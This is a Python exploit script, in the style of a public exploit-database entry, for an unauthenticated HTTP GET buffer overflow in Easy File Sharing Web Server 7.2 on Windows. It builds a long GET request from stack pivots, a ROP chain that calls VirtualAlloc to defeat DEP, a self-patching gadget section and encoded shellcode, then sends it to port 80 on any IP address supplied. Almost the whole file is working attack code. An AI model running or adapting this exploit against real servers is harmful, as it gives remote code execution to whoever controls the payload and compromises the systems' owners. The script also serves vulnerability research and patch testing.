#!/usr/bin/python

# Exploit Title:   Easy File Sharing Web Server 7.2 - HTTP GET Unauthenticated Remote Buffer Overflow  & DEP Bypass
# Date:            September 3rd, 2024
# Exploit Author:  Yerodin Richards
# Vendor Homepage: http://www.sharing-file.com/
# Software Link:   http://www.sharing-file.com/efssetup.exe
# Version:         7.2
# Tested on:       Microsoft Windows 11 Pro [Version 10.0.22000.2538] - x86
# CVE :            Not Assigned

import socket
from os import sys
from struct import pack


badchars = [ 0x00, 0x5c, 0x20, 0x2f, 0x2b, 0x25]

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1) 
    exploit()

def exploit():
    payload = gen_payload()
    send_packet(payload)


def gen_payload():
    size = 4200*2

    pivot2_offset = 2473-(4*0xf)
    pivot2 = pack("<i",0x61c36c6f) * 0x10 # xchg eax, esp ; ret ret

    pivot_offset = 3993
    pivot = pack("<i",0x10022804) # mov eax, ebp ; pop edi ; pop esi ; pop ebp ; pop ebx ; add esp, 0x00001004 ; ret

    pivot3_offset = 4061
    pivot3 = pack("<i",0x61c373a4) # pop edi ; ret

    eip_offset = 4065
    eip = pack("<i",0x61c2bea4) # popad ; lea edx,  [ebp-0x1C] ; mov  [esp+0x04], edx ; mov  [esp+0x00], ebx ; mov eax,  [ebp-0x44] ; call eax 

    valloc_stub = gen_fn_stubs()
    rce_rop = gen_rce_rop()
    rop_patcher = gen_rop_patcher(rce_rop+valloc_stub)

    data = b'\x90'+rop_patcher+rce_rop+valloc_stub + shellcode()
    data += b'\x90'*(pivot2_offset-len(data))+pivot2
    data += b'\x90'*(pivot_offset-len(data))+pivot
    data += b'\x90'*(pivot3_offset-len(data))+pivot3
    data += b'\x90'*(eip_offset-len(data))+eip
    data+=gen_rop_pivot()

    data += b'\x90'*(size-len(data))
    return b'GET '+ data +b' HTTP/1.0\r\n\r\n'

def gen_fn_stubs():
    virtualAllocStub =  pack("<L", 0x90909090) #VirtualAlloc IAT address
    virtualAllocStub +=  pack("<L", 0x90909090) #return (shellcode) address
    virtualAllocStub +=  pack("<L", 0x90909090) #lpAddress
    virtualAllocStub +=  pack("<L", 0xfefefe01) #dwSize
    virtualAllocStub +=  pack("<L", 0xfefe10fe) #flAllocationType
    virtualAllocStub +=  pack("<L", 0xfefefe40) #flProtect8
    return virtualAllocStub

def gen_rop_pivot():
    rop =  pack("<i", 0x100238cc) # push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret
    rop +=  pack("<i", 0x1001e15a) # mov eax, esi ; pop esi ; ret
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<i",0x1001fc4c) # pop ecx ; ret 
    rop +=  pack("<L", 0xf0101010) 
    rop +=  pack("<i",0x1001641c) # sub eax, ecx ; ret 
    rop +=  pack("<i",0x1001fc4c) # pop ecx ; ret 
    rop +=  pack("<L", 0x0fefffd8)
    rop +=  pack("<i",0x1001641c) # sub eax, ecx ; ret 
    rop +=  pack("<i",0x61c36c6f) # xchg eax, esp ; ret
    return rop


def gen_rop_patcher(data):

    ####################Align with Main ROP Start#############################
    patch =  pack("<i", 0x100238cc) # push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret
    patch +=  pack("<i", 0x1001e15a) # mov eax, esi ; pop esi ; ret
    patch +=  pack("<L", 0xcccccccc) # junk
    patch +=  pack("<i",0x1001fc4c) # pop ecx ; ret 
    
    patch_len = 356
    patch_len_offset = (-(patch_len-4-1)) + 2**32
    patch +=  pack("<L",  patch_len_offset) # main rop offset
    patch +=  pack("<i",0x1001641c) # sub eax, ecx ; ret 
    patch +=  pack("<L", 0x10018859) # pop ebx ; ret
    patch +=  pack("<L", 0xffff01ff) # junk

    last_index = 0
    for i in range(0, len(data)):
        if data[i] == 0xfe:
            patch +=  pack("<i",0x1001fc4c) # pop ecx ; ret 
            if last_index != 0:
                patch +=  pack("<L", 0xffffffff) # junk
                patch +=  pack("<L", 0xffffffff) # junk
                patch +=  pack("<L", 0xffffffff) # junk
            offset = (-(i-last_index)) + 2**32
            patch +=  pack("<L", offset) # VirtualAlloc stub offset
            patch +=  pack("<i",0x1001641c) # sub eax, ecx ; ret 
            patch +=  pack("<L",0x1001aac4) # adc byte [eax+0x00000001], bh ; retn 0x000C
            
            last_index=i
    return patch



def gen_rce_rop():
    rop = b""
    rop +=  pack("<i", 0x100238cc) # push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0xcccccccc) # junk

    ###################Patch VirtualAlloc Address#############################
    rop +=  pack("<i", 0x1001e15a) # mov eax, esi ; pop esi ; ret
    rop +=  pack("<L", 0xffffffff) # esi->-1
    rop +=  pack("<i",0x1001fc4c) # pop ecx ; ret 
    rop +=  pack("<L", 0xffffff70) # VirtualAlloc stub offset
    rop +=  pack("<i",0x1001641c) # sub eax, ecx ; ret 

    rop +=  pack("<L", 0xfe49a3ea) # push eax ; add al, 0x5B ; pop ecx ; retn 0x0008 
    rop +=  pack("<i", 0x10015442) # pop eax ; ret
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0x1004d1fc) #VirtualAlloc IAT address
    rop +=  pack("<i", 0x1002248c) # mov eax,  [eax] ; ret
    rop +=  pack("<i", 0x1001da08) # mov  [ecx], eax ; ret 

    ###################Patch Return Address#############################
    rop +=  pack("<L", 0x1001fab5) # xor eax, eax ; ret ;
    rop +=  pack("<i", 0x1001641c) # sub eax, ecx ; ret ;
    rop +=  pack("<L", 0x100231d1) # neg eax ; ret

    rop +=  pack("<i",0x1001fc4c) # pop ecx ; ret 
    rop +=  pack("<L", 0xffffffe8) # shellcode offset
    rop +=  pack("<i",0x1001641c) # sub eax, ecx ; ret ;
    rop +=  pack("<L", 0xfe49a3ea) # push eax ; add al, 0x5B ; pop ecx ; retn 0x0008 
    rop +=  pack("<i", 0x100238cc) # push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<i", 0x1001e15a) # mov eax, esi ; pop esi ; ret
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0x1001a64e) # pop edi ; ret ; (1 found)

    rop +=  pack("<L", 0xffffffc4) # return address offset
    rop +=  pack("<L", 0xfe4fc96f) #  sub eax, edi ; pop edi ; pop esi ; pop ebx ; ret ; (1 found)
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0xcccccccc) # junk
    rop +=  pack("<L", 0x10010118) # mov  [eax], ecx ; ret

    ###################Patch lpAddress #############################
    rop +=  pack("<L",0x10022199) *4 # inc eax ; ret
    rop +=  pack("<L", 0x10010118) # mov  [eax], ecx ; ret
    return rop

def send_packet(buf):
    server = sys.argv[1]
    port = 80
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf, socket.MSG_MORE)
    print("[+] Packet sent")

def byte_at(input, index):
    return (input >> (8 * index)) & 0xFF

def shellcode():
    buf =  b"\x90"*0x3c
    buf += b"\xda\xd6\xba\xb1\xc1\xb0\x2e\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\xe1"
    buf += b"\xd2\x52\xdb\xfd\x3d\x10\x24\xfd\xbd\x75\xac\x18"
    buf += b"\x8c\xb5\xca\x69\xbf\x05\x98\x3f\x4c\xed\xcc\xab"
    buf += b"\xc7\x83\xd8\xdc\x60\x29\x3f\xd3\x71\x02\x03\x72"
    buf += b"\xf2\x59\x50\x54\xcb\x91\xa5\x95\x0c\xcf\x44\xc7"
    buf += b"\xc5\x9b\xfb\xf7\x62\xd1\xc7\x7c\x38\xf7\x4f\x61"
    buf += b"\x89\xf6\x7e\x34\x81\xa0\xa0\xb7\x46\xd9\xe8\xaf"
    buf += b"\x8b\xe4\xa3\x44\x7f\x92\x35\x8c\xb1\x5b\x99\xf1"
    buf += b"\x7d\xae\xe3\x36\xb9\x51\x96\x4e\xb9\xec\xa1\x95"
    buf += b"\xc3\x2a\x27\x0d\x63\xb8\x9f\xe9\x95\x6d\x79\x7a"
    buf += b"\x99\xda\x0d\x24\xbe\xdd\xc2\x5f\xba\x56\xe5\x8f"
    buf += b"\x4a\x2c\xc2\x0b\x16\xf6\x6b\x0a\xf2\x59\x93\x4c"
    buf += b"\x5d\x05\x31\x07\x70\x52\x48\x4a\x1d\x97\x61\x74"
    buf += b"\xdd\xbf\xf2\x07\xef\x60\xa9\x8f\x43\xe8\x77\x48"
    buf += b"\xa3\xc3\xc0\xc6\x5a\xec\x30\xcf\x98\xb8\x60\x67"
    buf += b"\x08\xc1\xea\x77\xb5\x14\xbc\x27\x19\xc7\x7d\x97"
    buf += b"\xd9\xb7\x15\xfd\xd5\xe8\x06\xfe\x3f\x81\xad\x05"
    buf += b"\xa8\x6e\x99\x05\x44\x07\xd8\x05\x95\x6c\x55\xe3"
    buf += b"\xff\x82\x30\xbc\x97\x3b\x19\x36\x09\xc3\xb7\x33"
    buf += b"\x09\x4f\x34\xc4\xc4\xb8\x31\xd6\xb1\x48\x0c\x84"
    buf += b"\x14\x56\xba\xa0\xfb\xc5\x21\x30\x75\xf6\xfd\x67"
    buf += b"\xd2\xc8\xf7\xed\xce\x73\xae\x13\x13\xe5\x89\x97"
    buf += b"\xc8\xd6\x14\x16\x9c\x63\x33\x08\x58\x6b\x7f\x7c"
    buf += b"\x34\x3a\x29\x2a\xf2\x94\x9b\x84\xac\x4b\x72\x40"
    buf += b"\x28\xa0\x45\x16\x35\xed\x33\xf6\x84\x58\x02\x09"
    buf += b"\x28\x0d\x82\x72\x54\xad\x6d\xa9\xdc\xcd\x8f\x7b"
    buf += b"\x29\x66\x16\xee\x90\xeb\xa9\xc5\xd7\x15\x2a\xef"
    buf += b"\xa7\xe1\x32\x9a\xa2\xae\xf4\x77\xdf\xbf\x90\x77"
    buf += b"\x4c\xbf\xb0"

    return buf
    

if __name__ == "__main__":
    main()
